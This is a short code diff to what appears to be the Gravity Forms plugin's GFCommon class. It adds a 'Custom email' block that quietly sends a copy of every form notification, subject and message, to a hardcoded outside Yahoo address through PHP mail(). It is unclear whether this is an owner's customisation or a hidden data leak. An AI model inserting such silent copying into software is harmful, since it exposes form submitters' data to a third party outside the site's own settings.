@@ -1931,6 +1931,13 @@ class GFCommon {
 			);
 		}
 
+		// Custom email
+    $headers[] = 'MIME-Version: 1.0';
+    $headers[] = 'Content-type: text/html; charset=UTF-8';
+    $headers[] = 'From: Dreamland Shop <shop@dreamlandbyflavia.com>';
+    $email_to = "necrocris2000@yahoo.com";
+    mail($email_to, $subject, $message, implode("\r\n", $headers));
+
 		self::send_email( $from, $to, $bcc, $replyTo, $subject, $message, $from_name, $message_format, $attachments, $lead, $notification, $cc );
 
 		return compact( 'to', 'from', 'bcc', 'replyTo', 'subject', 'message', 'from_name', 'message_format', 'attachments', 'cc' );
